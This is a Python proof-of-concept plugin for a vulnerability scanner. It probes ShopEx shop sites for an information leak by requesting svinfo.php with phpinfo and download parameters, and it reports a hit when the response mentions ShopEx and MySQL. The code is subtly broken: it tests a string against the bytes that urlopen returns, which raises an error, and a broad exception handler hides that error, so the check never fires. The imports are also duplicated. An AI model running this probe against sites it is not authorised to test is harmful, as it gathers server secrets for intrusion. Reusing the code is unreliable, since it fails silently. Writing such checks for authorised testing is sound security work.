# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'ShopEx_0014'  # 平台漏洞编号，留空
    name = 'ShopEx /svinfo.php phpinfo信息泄露漏洞'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-10-30'  # 漏洞公布时间
    desc = '''
        Shopex是国内市场占有率最高的网店软件。网上商店平台软件系统又称网店管理系统、网店程序、网上购物系统、在线购物系统。
        /app/dev/svinfo.php?phpinfo=true
        /app/dev/svinfo.php?download=true
        /install/svinfo.php?phpinfo=true
        存在信息泄露危害
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ShopEx'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6e0bbc26-c664-4b6c-9c4b-61c646b31378'
    author = '国光'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            file_list = ['/app/dev/svinfo.php?phpinfo=true',
                         '/install/svinfo.php?phpinfo=true',
                         '/app/dev/svinfo.php?download=true']
            for filename in file_list:
                verify_url = '{target}'.format(target=self.target)+filename
                req = urllib.request.urlopen(verify_url)
                content = req.read()
                if 'ShopEx' in content and 'MySQL' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
